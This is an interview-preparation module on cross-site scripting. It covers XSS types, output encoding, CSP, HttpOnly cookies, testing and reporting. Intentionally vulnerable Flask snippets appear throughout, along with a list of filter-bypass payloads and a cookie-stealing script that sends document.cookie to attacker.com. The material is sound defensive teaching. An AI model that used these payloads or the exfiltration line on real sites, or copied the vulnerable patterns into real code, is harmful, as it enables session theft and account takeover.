# XSS - Interview Questions & Answers

<!-- interview-module:v1 -->

> **How to use this interview module**
>
> **Practice:** Cover each answer, then explain it aloud in **60–120 seconds**. Add **one concrete example** from work or a lab.
>
> **Pair with:** the **Comprehensive Guide** and **Critical Clarification** for this topic (if present).

---


## **Fundamental Questions**

### **Q1: What is XSS and how does it work?**

**Answer:**

XSS (Cross-Site Scripting) is a vulnerability that allows attackers to inject malicious JavaScript into web pages viewed by other users.

**How it works:**

1. **Attacker submits malicious script** to application (via forms, URLs, etc.)
2. **Application fails to encode** user input before outputting it
3. **Malicious script included** in HTML response
4. **Victim's browser receives** HTML with malicious script
5. **Browser executes script** in context of vulnerable application
6. **Script runs with application's privileges** (can access cookies, DOM, etc.)

**Example:**

```python
# Vulnerable code
@app.route('/search')
def search():
    query = request.args.get('q')
    return f"<h1>Results for: {query}</h1>"  # XSS!

# Attack
# URL: /search?q=<script>alert('XSS')</script>

```

**Key Point:** XSS occurs when user input is not properly encoded before being included in HTML output, allowing attackers to inject and execute malicious scripts.

---

### **Q2: What are the three main types of XSS?**

**Answer:**

**1. Reflected XSS (Non-Persistent):**

- Payload reflected immediately in response
- Not stored on server
- Requires user interaction (clicking link)
- Example: URL parameter reflection

**2. Stored XSS (Persistent):**

- Payload stored on server (database, file, etc.)
- Executed when victim views affected page
- No user interaction needed
- More dangerous than reflected XSS
- Example: Malicious comment stored in database

**3. DOM-Based XSS:**

- Vulnerability in client-side JavaScript
- No server-side reflection needed
- Payload in URL fragment (#) or parameters
- Example: JavaScript uses `location.hash` unsafely

---

### **Q3: Why is output encoding more important than input validation for preventing XSS?**

**Answer:**

**Output encoding prevents XSS because:**

- Encodes data based on **context** (HTML, JavaScript, URL, CSS)
- Prevents browser from interpreting input as code
- Applied immediately before rendering
- Works regardless of input source

**Input validation alone doesn't prevent XSS because:**

- Validation may be bypassed
- Input might be used in different contexts
- Validated input can still contain XSS in wrong context
- Input validation doesn't encode output

**Example:**

```python
# ❌ Input validation alone
def validate_input(input_value):
    if '<script>' in input_value:
        return input_value.replace('<script>', '')
    return input_value

cleaned = validate_input('<script>alert(1)</script>')
# Result: alert(1)  (still dangerous!)

# Output to HTML
document.innerHTML = cleaned;  # Still executes!

# ✅ Output encoding
from html import escape
user_input = '<script>alert(1)</script>'
safe_output = escape(user_input)
# Result: &lt;script&gt;alert(1)&lt;/script&gt;
# Safe: Browser treats as text, not code

```

**Key Point:** Encode output based on context, not just validate input. Output encoding is the primary defense against XSS.

---

## **Types and Mechanisms**

### **Q4: Explain the difference between Reflected and Stored XSS with examples.**

**Answer:**

**Reflected XSS:**

**Example:**

```python
# Vulnerable code
@app.route('/search')
def search():
    query = request.args.get('q')
    return f"<h1>Results for: {query}</h1>"

# Attack: User visits malicious URL
# /search?q=<script>alert('XSS')</script>

```

**Characteristics:**

- Payload in URL/request
- Not stored on server
- Requires user to click link
- Appears to come from legitimate domain

**Stored XSS:**

**Example:**

```python
# Vulnerable code
@app.route('/comment', methods=['POST'])
def add_comment():
    comment = request.form['comment']
    db.comments.insert({'comment': comment})  # Stored!
    return "Comment added"

@app.route('/post/<id>')
def show_post(id):
    comments = db.comments.find({'post_id': id})
    return render_template('post.html', comments=comments)  # Displayed!

# Attack: Attacker submits malicious comment
# Comment: <script>alert('XSS')</script>
# Stored in database, executed for all users viewing post

```

**Characteristics:**

- Payload stored on server
- Affects all users viewing content
- No user interaction needed
- More dangerous and persistent

---

### **Q5: What is DOM-Based XSS and how is it different?**

**Answer:**

DOM-Based XSS occurs when client-side JavaScript unsafely manipulates the DOM based on user input.

**Example:**

```jsx
// Vulnerable client-side code
const urlParams = new URLSearchParams(window.location.search);
const name = urlParams.get('name');
document.getElementById('greeting').innerHTML = 'Hello ' + name;

// Attack
// URL: /page?name=<script>alert('XSS')</script>
// innerHTML executes script

```

**Differences from Reflected/Stored XSS:**

1. **Vulnerability Location:**
    - DOM-Based: Client-side JavaScript
    - Reflected/Stored: Server-side code
2. **Payload Source:**
    - DOM-Based: URL fragment (#), parameters, localStorage, etc.
    - Reflected: Request parameters
    - Stored: Database/file storage
3. **Detection:**
    - DOM-Based: Requires client-side testing
    - Reflected/Stored: Can be detected server-side
4. **Mitigation:**
    - DOM-Based: Use safe DOM APIs (textContent, not innerHTML)
    - Reflected/Stored: Server-side output encoding

---

## **Mitigation Questions**

### **Q6: How does output encoding prevent XSS?**

**Answer:**

Output encoding converts special characters to their HTML entities or encoded representations, preventing the browser from interpreting them as code.

**HTML Context Encoding:**

```python
from html import escape

user_input = "<script>alert('XSS')</script>"
safe_output = escape(user_input)
# Result: &lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;

# Browser treats as text, not executable code
<h1>{safe_output}</h1>

```

**Why It Works:**

- Special characters (`<`, `>`, `&`, `"`, `'`) converted to entities
- Browser treats entities as text, not HTML/JavaScript
- Scripts cannot execute because they're encoded

**Context-Specific Encoding:**

**HTML Body:**

```python
from html import escape
safe_output = escape(user_input)

```

**HTML Attribute:**

```python
from html import escape
safe_output = escape(user_input, quote=True)

```

**JavaScript:**

```python
import json
safe_output = json.dumps(user_input)

```

**URL:**

```python
from urllib.parse import quote
safe_output = quote(user_input)

```

**Key Point:** Encode output based on the context where it's used. Different contexts require different encoding methods.

---

### **Q7: What is Content Security Policy (CSP) and how does it help prevent XSS?**

**Answer:**

CSP (Content Security Policy) is an HTTP header that restricts which sources can load content (scripts, styles, images, etc.), reducing the impact of XSS attacks.

**How CSP Works:**

```python
response.headers['Content-Security-Policy'] = (
    "default-src 'self'; "           # Only same-origin by default
    "script-src 'self'; "            # Only same-origin scripts
    "style-src 'self' 'unsafe-inline'; "  # Same-origin + inline styles
    "img-src 'self' https:; "        # Same-origin + HTTPS images
    "connect-src 'self'; "           # Same-origin fetch/XHR
    "object-src 'none'; "            # No object/embed/applet
    "base-uri 'self'; "              # Only same-origin base URIs
    "form-action 'self'; "           # Only same-origin form submissions
    "frame-ancestors 'none'"         # Cannot be embedded
)

```

**Benefits:**

- Prevents inline scripts from executing (if `'unsafe-inline'` not allowed)
- Restricts script sources to whitelisted domains
- Prevents data URI scripts
- Reduces XSS impact even if encoding fails

**Limitations:**

- Doesn't prevent XSS itself, only reduces impact
- Can be bypassed if misconfigured
- Not a substitute for output encoding
- Requires careful configuration

**Key Point:** CSP is a defense-in-depth measure that reduces XSS impact but doesn't replace output encoding.

---

### **Q8: Why are HttpOnly cookies important for XSS protection?**

**Answer:**

HttpOnly cookies prevent JavaScript from accessing cookies via `document.cookie`, protecting session cookies from XSS attacks.

**How It Works:**

```python
# Set HttpOnly cookie
response.set_cookie(
    'sessionId',
    value=session_id,
    httponly=True,  # JavaScript cannot access
    secure=True,    # HTTPS only
    samesite='Strict'
)

```

**Protection:**

```jsx
// XSS payload
<script>
  fetch('http://attacker.com/steal?cookie=' + document.cookie);
</script>

// With HttpOnly: document.cookie doesn't include sessionId
// Attack fails: session cookie not accessible to JavaScript

```

**Benefits:**

- Prevents cookie theft via XSS
- Reduces impact of XSS attacks
- Easy to implement

**Limitations:**

- Only protects cookies, not XSS itself
- Doesn't prevent other XSS impacts (keylogging, defacement, etc.)
- Use with output encoding and CSP

**Key Point:** HttpOnly cookies prevent cookie theft but don't prevent XSS. Use with output encoding and CSP for complete protection.

---

## **Security Questions**

### **Q9: What is the impact of XSS vulnerabilities?**

**Answer:**

**1. Session Hijacking:**

- Steal session cookies
- Impersonate users
- Gain unauthorized access to accounts

**2. Data Theft:**

- Extract sensitive information
- Steal credentials
- Access personal data

**3. Defacement:**

- Modify page content
- Display malicious content
- Damage reputation

**4. Keylogging:**

- Capture user keystrokes
- Steal passwords
- Monitor user activity

**5. Phishing:**

- Display fake login forms
- Trick users into providing credentials
- Steal sensitive information

**6. Malware Delivery:**

- Redirect to malicious sites
- Download malware
- Compromise user systems

**Business Impact:**

- Account compromise
- Financial fraud
- Data breach
- Reputation damage
- Legal liability
- Regulatory violations

---

### **Q10: Why doesn't input validation alone prevent XSS?**

**Answer:**

**Input validation limitations:**

1. **Context Mismatch:**
    - Input might be valid but dangerous in HTML context
    - Validation doesn't know where input will be used
2. **Bypass Techniques:**
    - Encoding can bypass validation
    - Multiple encoding layers
    - Alternative payload formats
3. **No Output Encoding:**
    - Validation happens at input time
    - Output encoding happens at output time
    - Validation doesn't encode output

**Example:**

```python
# ❌ Input validation alone
def validate_input(input_value):
    # Remove <script> tags
    return input_value.replace('<script>', '').replace('</script>', '')

cleaned = validate_input('<script>alert(1)</script>')
# Result: alert(1)  (still dangerous!)

# Output to HTML
document.innerHTML = cleaned;  # Still executes!

# ✅ Output encoding
from html import escape
user_input = '<script>alert(1)</script>'
safe_output = escape(user_input)
# Result: &lt;script&gt;alert(1)&lt;/script&gt;
# Safe: Browser treats as text

```

**Best Practice:**

- Use input validation for data integrity
- Use output encoding for XSS prevention
- Both work together but serve different purposes

---

## **Scenario-Based Questions**

### **Q11: You discover a search feature that reflects user input. How would you test for XSS?**

**Answer:**

**Step 1: Identify Input Point**

```python
# Vulnerable code
@app.route('/search')
def search():
    query = request.args.get('q')
    return f"<h1>Results for: {query}</h1>"

```

**Step 2: Test Basic Payload**

```
URL: /search?q=<script>alert('XSS')</script>

```

**Step 3: Determine Context**

- Check where input is reflected
- Identify encoding/filtering
- Determine injection context (HTML, JavaScript, attribute)

**Step 4: Test Context-Specific Payloads**

**HTML Context:**

```
<script>alert('XSS')</script>
<img src=x onerror="alert('XSS')">
<svg onload="alert('XSS')">

```

**JavaScript Context:**

```
'; alert('XSS'); //

```

**Attribute Context:**

```
" onmouseover="alert('XSS')

```

**Step 5: Test Encoding Bypasses**

- HTML entities
- Unicode encoding
- URL encoding
- Case variation

**Step 6: Verify Exploitation**

- Check if script executes
- Test in different browsers
- Validate impact

---

### **Q12: How would you fix a stored XSS vulnerability in a comment system?**

**Answer:**

**Vulnerable Code:**

```python
@app.route('/comment', methods=['POST'])
def add_comment():
    comment = request.form['comment']
    db.comments.insert({'comment': comment})  # Stored without encoding!
    return "Comment added"

@app.route('/post/<id>')
def show_post(id):
    comments = db.comments.find({'post_id': id})
    return render_template('post.html', comments=comments)  # Displayed!

```

**Fix: Output Encoding**

```python
from html import escape

@app.route('/comment', methods=['POST'])
def add_comment():
    comment = request.form['comment']
    # Optionally validate input
    if len(comment) > 1000:
        return "Comment too long", 400
    db.comments.insert({'comment': comment})
    return "Comment added"

@app.route('/post/<id>')
def show_post(id):
    comments = db.comments.find({'post_id': id})
    # Encode on output
    safe_comments = [{'comment': escape(c['comment'])} for c in comments]
    return render_template('post.html', comments=safe_comments)

```

**Template (Jinja2 auto-escaping):**

```html
<!-- post.html -->
{% for comment in comments %}
  <div class="comment">{{ comment.comment }}</div>  <!-- Auto-escaped! -->
{% endfor %}

```

**Additional Defenses:**

- Implement CSP
- Use HttpOnly cookies
- Input validation (length, content type)
- Rate limiting

---

## **Advanced Questions**

### **Q13: How can you bypass XSS filters?**

**Answer:**

**1. Case Variation:**

```html
<ScRiPt>alert('XSS')</ScRiPt>
<sCrIpT>alert('XSS')</sCrIpT>

```

**2. Encoding:**

```html
<!-- HTML entities -->
&lt;script&gt;alert('XSS')&lt;/script&gt;

<!-- Unicode -->
<script>\u0061lert('XSS')</script>

```

**3. Event Handlers:**

```html
<img src=x onerror="alert('XSS')">
<div onclick="alert('XSS')">Click</div>
<svg onload="alert('XSS')"></svg>

```

**4. Alternative Tags:**

```html
<iframe src="javascript:alert('XSS')"></iframe>
<body onload="alert('XSS')">
<details open ontoggle="alert('XSS')">

```

**5. Filter Evasion:**

```html
<!-- If <script> is filtered -->
<script>alert('XSS')</script>

<!-- Try alternatives -->
<img src=x onerror="alert('XSS')">
<svg onload="alert('XSS')">

```

**6. Context-Specific:**

```jsx
// If HTML encoding exists, try JavaScript context
'; alert('XSS'); //

```

**Key Point:** Most bypasses work because filters are incomplete. Use output encoding based on context, not blacklist filtering.

---

### **Q14: What is the difference between innerHTML and textContent in terms of XSS?**

**Answer:**

**innerHTML:**

- Sets/gets HTML content
- Parses HTML tags
- **Vulnerable to XSS** - Executes scripts

**textContent:**

- Sets/gets text content only
- Treats input as plain text
- **Safe from XSS** - No HTML parsing

**Example:**

```jsx
const userInput = "<script>alert('XSS')</script>";

// ❌ VULNERABLE: innerHTML
element.innerHTML = userInput;
// Result: Script executes!

// ✅ SECURE: textContent
element.textContent = userInput;
// Result: Text displayed as-is, no execution

// Output:
// innerHTML: (script executes)
// textContent: <script>alert('XSS')</script> (displayed as text)

```

**Best Practice:**

- Use `textContent` for user input
- Only use `innerHTML` for trusted content
- Always encode if using `innerHTML` with untrusted data

---

## **Penetration Testing Questions**

### **Q15: What tools would you use to test for XSS?**

**Answer:**

**1. Burp Suite:**

- Manual testing and payload crafting
- Intruder for automated payload testing
- XSS Validator extension
- Proxy for request manipulation

**2. OWASP ZAP:**

- Automated XSS scanning
- Manual testing tools
- Reporting capabilities
- Active and passive scanning

**3. Browser Developer Tools:**

- Console for testing JavaScript
- Network tab for payload analysis
- Sources for debugging
- Elements for DOM inspection

**4. Custom Scripts:**

```python
import requests

def test_xss(target_url, payload):
    params = {'q': payload}
    response = requests.get(target_url, params=params)
    if payload in response.text and '<script>' in payload:
        return "Potential XSS"
    return "No XSS detected"

```

---

### **Q16: How would you report an XSS vulnerability?**

**Answer:**

**Report Structure:**

**1. Executive Summary:**

- Vulnerability type (XSS)
- Severity (Critical/High/Medium)
- Affected component
- Business impact

**2. Technical Details:**

- Vulnerable endpoint/function
- Injection point
- Attack vector
- Proof of concept

**3. Impact Assessment:**

- Potential actions attacker can perform
- Confidentiality impact (cookie theft, data access)
- Integrity impact (content modification)
- Availability impact (DoS potential)
- Business impact

**4. Steps to Reproduce:**

```
1. Navigate to vulnerable page
2. Submit XSS payload
3. Observe script execution
4. Verify impact

```

**5. Remediation:**

- Implement output encoding
- Use CSP headers
- Set HttpOnly cookies
- Validate input

**6. Evidence:**

- Screenshots
- Request/response logs
- Payload examples
- Video demonstration

---

## **Summary**

XSS is a critical web application vulnerability. Key points for interviews:

1. **XSS occurs when output is not encoded** - Encode based on context
2. **Three types: Reflected, Stored, DOM-Based** - Each requires different testing
3. **Output encoding is primary defense** - Not input validation alone
4. **CSP reduces impact** - But doesn't prevent XSS
5. **HttpOnly cookies prevent cookie theft** - But don't prevent XSS
6. **Use safe DOM APIs** - textContent, not innerHTML
7. **Test thoroughly** - Code reviews, scanners, manual testing

Remember: **XSS is prevented by output encoding based on context (HTML, JavaScript, URL, CSS), not by input validation or CSP alone!**

---

## Depth: Interview follow-ups — XSS

**Authoritative references:** [OWASP XSS](https://owasp.org/www-community/attacks/xss/); [XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html); [CSP](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html).

**Follow-ups:**
- **Contextual encoding:** HTML vs JS vs URL vs CSS—why “encode everything” still fails if wrong context.
- **DOM XSS:** Sources and sinks in SPA frameworks.
- **CSP** as backstop—`unsafe-inline` realities.

**Production verification:** DOMPurify patterns where needed; CSP reports; no user HTML in dangerous sinks.

**Cross-read:** CSRF, Cookie Security, Browser/Frontend Deep Dive, Security Headers.

<!-- verified-depth-merged:v1 ids=xss -->
